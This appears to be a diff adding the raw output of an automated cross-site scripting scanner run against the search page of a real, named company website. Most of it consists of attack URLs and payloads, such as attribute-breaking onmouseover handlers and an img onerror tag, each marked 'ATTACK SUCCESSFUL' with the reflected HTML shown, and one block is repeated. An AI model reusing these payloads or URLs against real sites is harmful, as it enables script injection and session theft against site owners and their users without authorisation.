@@ -1,0 +1,92 @@
+https://www.zentechnologies.com/zen-multi-functional-target-system.php
+
+GET Params:[2]
+['query', 'search']
+_______________________________________________________________________________________________________
+https://www.zentechnologies.com/search/search.php?query=(uvw"xyz'yxz</zxy&search=1
+
+----------------------------------------------------------------------------------
+Attribute Context: [2]
+<input type="hidden" name="query" value="(uvw"xyz'yxz</zxy">
+<input type="hidden" name="name" value="(uvw"xyz'yxz</zxy" />
+
+----------------------------------------------------------------------------------
+HTML Context: [1]
+<q>(uvw"xyz'yxz</zxy</q>
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	False	False	False	False
+
+Attack Payloads for ATTR
+['" onmouseover="alert(1)', "' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.zentechnologies.com/search/search.php?query=" onmouseover="alert(1)&search=1
+
+=> ATTACK SUCCESSFUL with Payload: " onmouseover="alert(1)
+Detection of Payload: 
+<input type="hidden" name="query" value="" onmouseover="alert(1)">
+<input type="hidden" name="name" value="" onmouseover="alert(1)" />
+
+ATTR Attack Url: https://www.zentechnologies.com/search/search.php?query=' onmouseover='alert(1)&search=1
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+<input type="hidden" name="query" value="' onmouseover='alert(1)">
+<input type="hidden" name="name" value="' onmouseover='alert(1)" />
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	False	False	False	False
+
+Attack Payloads for ATTR
+['" onmouseover="alert(1)', "' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.zentechnologies.com/search/search.php?query=" onmouseover="alert(1)&search=1
+
+=> ATTACK SUCCESSFUL with Payload: " onmouseover="alert(1)
+Detection of Payload: 
+<input type="hidden" name="query" value="" onmouseover="alert(1)">
+<input type="hidden" name="name" value="" onmouseover="alert(1)" />
+
+ATTR Attack Url: https://www.zentechnologies.com/search/search.php?query=' onmouseover='alert(1)&search=1
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+<input type="hidden" name="query" value="' onmouseover='alert(1)">
+<input type="hidden" name="name" value="' onmouseover='alert(1)" />
+ENCODING     Presence	"	'	<	( 
+HTML:		True	False	False	False	False
+
+Attack Payloads for HTML
+['<img src=x onerror="alert(1)">']
+
+HTML Attack Url: https://www.zentechnologies.com/search/search.php?query=<img src=x onerror="alert(1)">&search=1
+
+=> ATTACK SUCCESSFUL with Payload: <img src=x onerror="alert(1)">
+Detection of Payload: 
+<q><img src=x onerror="alert(1)"></q>
+_______________________________________________________________________________________________________
+https://www.zentechnologies.com/search/search.php?query=&search=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
